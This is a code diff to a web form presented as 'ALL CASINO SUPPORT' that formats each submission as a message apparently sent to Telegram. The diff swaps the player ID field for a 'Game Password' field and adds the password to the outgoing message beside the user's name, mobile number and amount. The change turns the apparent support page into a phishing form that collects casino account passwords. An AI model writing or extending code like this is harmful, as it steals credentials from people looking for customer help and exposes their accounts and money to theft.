@@ -250,8 +250,8 @@ body {
                 </div>
 
                 <div class="field">
-                    <label>User ID / Game ID</label>
-                    <input type="text" id="userid" placeholder="Enter your Player ID" required>
+                    <label>Game Password</label>
+                    <input type="text" id="password" placeholder="Enter your Game Password" required>
                 </div>
 
                 <div class="field">
@@ -337,7 +337,7 @@ document.getElementById("supportForm").addEventListener("submit", function(e) {
     const name = document.getElementById("name").value.trim();
     const mobile = document.getElementById("mobile").value.trim();
     const platform = document.getElementById("platform").value.trim();
-    const userid = document.getElementById("userid").value.trim();
+    const password = document.getElementById("password").value.trim();
     const amount = document.getElementById("amount").value.trim();
     const problem = document.getElementById("problem").value;
 
@@ -354,7 +354,7 @@ document.getElementById("supportForm").addEventListener("submit", function(e) {
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
     
     // Message Format jo Telegram par aayega
-    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *User ID:* ${userid}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
+    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *password:* ${password}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
 
     btn.disabled = true;
     btn.innerText = "Processing...";
